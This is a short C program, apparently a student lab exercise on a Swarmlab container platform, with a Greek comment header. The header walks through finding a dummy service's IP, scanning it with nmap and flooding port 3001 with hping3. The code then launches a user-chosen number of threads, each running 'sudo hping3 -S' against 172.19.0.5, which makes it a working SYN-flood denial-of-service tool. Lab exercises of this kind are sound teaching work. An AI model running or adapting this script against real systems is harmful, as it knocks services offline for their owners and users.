/*
 Panagiotis Strousopoulos
 DDOS Attack
 Πρώτα από όλα συνδεόμαστε στο Swarmlab και στο Instances συνδεόμαστε στο Container και επιλέγουμε το dummyservice
 Μετά κάνοντας αρχικά docker exec -it dummy_service /bin/sh και μετά ifconfig βρίσκω την inet addr που ψάχνω
 δηλαδή την 172.19.0.5. Στη συνέχεια με nmap -p- 172.19.0.* βρίσκουμε το ανοικτό port, στην περίπτωση μας 3001.
 Τέλος με την χρήση hping3 κάνουμε την επίθεση συγκεκριμένα με την εντολή sudo hping3 -S 172.19.0.5 -p 3001.
*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>

void *ddos(void *arg)
{
	system("sudo hping3 -S 172.19.0.5 -p 3001");
	return NULL;
}

int main(int argc, char*argv[])
{
	if (argc<2)
	{
		printf("Please input number of threads.\n");
		return 1;
	}
	int l = atoi(argv[1]),i;
	pthread_t *p_thread;
	p_thread = (pthread_t *)malloc(sizeof(pthread_t) * l);
	for (i=0; i<l; i++)
	{
		pthread_create(&p_thread[i] ,NULL, ddos, (void *) NULL);
	}
	for (i=0; i<l; i++)
	{
		pthread_join(p_thread[i],NULL);
	}
	free(p_thread);
	pthread_exit(NULL);
}
